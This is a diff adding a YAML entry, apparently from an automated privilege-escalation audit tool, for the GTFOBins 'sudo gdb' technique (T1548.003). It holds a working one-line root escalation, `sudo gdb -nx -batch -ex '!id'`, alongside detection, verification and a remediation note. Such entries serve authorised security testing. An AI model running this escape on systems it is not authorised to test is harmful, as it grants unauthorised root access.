@@ -1,0 +1,25 @@
+# Sudo → root via gdb (GTFOBins)
+technique: T1548.003
+name: Sudo → root via gdb (GTFOBins)
+tactic: [privilege-escalation]
+platform: [linux]
+ranking:
+  exploitability: high
+  safety: read-only
+  detection: quiet
+detect:
+  sudo_allows: gdb
+execute:
+  command: |-
+    sudo gdb -nx -batch -ex '!id'
+verify:
+  success: "uid=0"
+cleanup:
+  command: ""
+report:
+  vector_type: gtfobins_sudo
+  description: >
+    Sudo NOPASSWD on `gdb` — the ! shell-escape runs arbitrary commands as root.
+  remediation: >
+    Drop `gdb` from sudoers.
+  refs: [T1548.003, GTFOBins/gdb]
